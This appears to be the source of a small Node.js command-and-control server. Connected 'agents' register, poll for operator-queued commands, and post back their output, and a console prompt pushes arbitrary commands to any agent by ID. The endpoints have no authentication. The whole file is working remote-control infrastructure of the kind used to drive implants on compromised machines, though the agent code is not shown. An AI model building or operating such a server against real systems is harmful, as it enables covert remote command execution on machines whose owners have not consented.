const express = require('express');
const bodyParser = require('body-parser');
const process = require('process');
const events = require('events');

// local imports
const prompt = require('./prompt');

const eventEmitter = new events.EventEmitter();
const app = express();
const PORT = 3000;

const agents = {}; // connected agents

// ---------- express endpoints ---------- //

// support parsing of application/json POST data
app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());

let newId = 0;
app.post('/connect', (req, res) => {
  const agent = req.body;
  console.log(`New agent ${JSON.stringify(agent)} with ID ${newId}`);

  agent.commands = [];
  agents[newId] = agent;

  res.end(newId.toString());

  newId++;
});

app.post('/disconnect', (req, res) => {
  const { id } = req.body;
  console.log(`Agent ${JSON.stringify(agents[id])} with ID ${id} has disconnected`);

  delete agents[id];
  res.end('Successfully disconnected');
});

app.post('/command', (req, res) => {
  const { id } = req.body;
  const agent = agents[id];

  if (agent.commands.length === 0) {
    res.end();
  } else {
    res.end(agent.commands.pop());
  }
});

app.post('/output', (req, res) => {
  const { output } = req.body;
  console.log('\x1b[32m%s\x1b[0m', output);
  res.end();
});

// start server
app.listen(PORT, () => {
  console.log(`Started on port ${PORT}`);

  // start prompting for user input
  prompt.start('> ', eventEmitter);
});

// ---------- event handlers ---------- //

eventEmitter.on('agent', (id, ...cmd) => {
  if (id == null || cmd.length === 0) {
    console.log('Usage: agent <id> <cmd>');
    return;
  }

  if (agents[id] == null) {
    console.log('\x1b[31m%s\x1b[0m', 'An agent with that ID does not exist');
    return;
  }

  // join cmd array into a string
  const command = cmd.join(' ');

  console.log(`Executing ${command} on agent ${id}`);
  agents[id].commands.push(command);
});

eventEmitter.on('exit', () => {
  console.log('Shutting down server');
  process.exit();
});
